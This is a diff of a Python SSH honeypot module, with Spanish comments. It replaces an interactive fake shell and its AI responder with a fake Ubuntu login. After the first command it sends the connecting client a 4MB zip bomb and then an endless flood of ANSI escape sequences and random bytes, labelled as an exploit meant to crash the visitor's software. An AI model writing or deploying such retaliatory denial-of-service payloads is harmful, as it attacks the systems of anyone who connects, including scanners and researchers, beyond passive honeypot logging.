@@ -1,55 +1,45 @@
 import time
 import os
 import random
-from scripts import network_simulator
-try:
-    from scripts import oracle_engine
-except ImportError:
-    oracle_engine = None
-
-LOG_FILE = "logs/hell_activity.log"
+from scripts import zip_generator
 
 def terminal_crusher(client_socket):
+    """Mantenemos el motor ANSI para rematar la sesión"""
     ansi_bomb = b"\x1b[2J\x1b[H\x1b[?1049h"
     try:
         while True:
-            payload = ansi_bomb
-            for _ in range(15):
-                color = os.random(1)[0] if hasattr(os, 'random') else random.randint(0,255)
-                payload += f"\x1b[48;5;{color}m".encode() + b"\x00" * 150000 + b"\a"
+            payload = ansi_bomb + (os.urandom(1024 * 100)) # Inyección de basura rápida
             client_socket.send(payload)
-            time.sleep(0.04)
+            time.sleep(0.05)
     except: pass
 
-def handle_cowrie_trap(client_socket, ip, hit_count=0):
+def handle_cowrie_trap(client_socket, ip):
+    """Simulación de Cowrie que entrega la Bomba Fifield por el canal SSH"""
     try:
+        banner = b"Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-89-generic x86_64)\r\n\r\n"
+        client_socket.send(banner)
+        client_socket.send(f"hell-node-01 login: ".encode())
+        client_socket.recv(1024)
+        client_socket.send(b"Password: ")
+        client_socket.recv(1024)
+        
         prompt = b"root@hell-node-01:~# "
-        client_socket.send(b"Welcome to Ubuntu 22.04.3 LTS\r\n")
+        client_socket.send(b"\r\nWelcome to Ubuntu 22.04.3 LTS\r\n")
         client_socket.send(prompt)
 
-        while True:
-            cmd_data = client_socket.recv(1024)
-            if not cmd_data: break
-            cmd = cmd_data.decode('utf-8', errors='ignore').strip()
-            
-            if not cmd:
-                client_socket.send(prompt)
-                continue
-
-            if "ssh" in cmd or "ping" in cmd or "nmap" in cmd:
-                fake_target = "10.0.0." + str(random.randint(2, 254))
-                network_simulator.handle_lateral_request(client_socket, fake_target)
-                return
-
-            # --- ORACLE AI WITH MEMORY ---
-            if oracle_engine and oracle_engine.oracle.enabled:
-                ai_resp = oracle_engine.oracle.get_dynamic_response(ip, cmd)
-                # Loggear interacción del Oráculo
-                with open(LOG_FILE, "a") as f:
-                    f.write(f"[🔮 ORACLE] IP {ip} executed '{cmd}' -> AI responded with {len(ai_resp)} bytes.\n")
-                client_socket.send(f"{ai_resp}\r\n".encode())
-            else:
-                client_socket.send(f"{cmd}: command not found\r\n".encode())
-            
-            client_socket.send(prompt)
+        # Esperar primer comando
+        cmd = client_socket.recv(1024)
+        
+        # EXPLOIT CHANNEL: Enviamos la bomba ZIP de 4MB como "Binary Data Stream"
+        print(f"[💀] SSH CHANNEL EXPLOIT: Enviando Bomba Fifield de 4MB a {ip}")
+        client_socket.send(b"\r\n*** SYSTEM CRITICAL ERROR: MEMORY CORRUPTION ***\r\n")
+        client_socket.send(b"*** INITIATING CORE DUMP (BINARY STREAM) ***\r\n")
+        
+        # Generar y enviar los 4MB que se expanden a Gigabytes
+        zip_payload = zip_generator.generate_ultra_zip()
+        client_socket.send(zip_payload)
+        
+        # Seguir con el Terminal Crusher para asegurar el colapso del software del atacante
+        terminal_crusher(client_socket)
+        
     except: pass
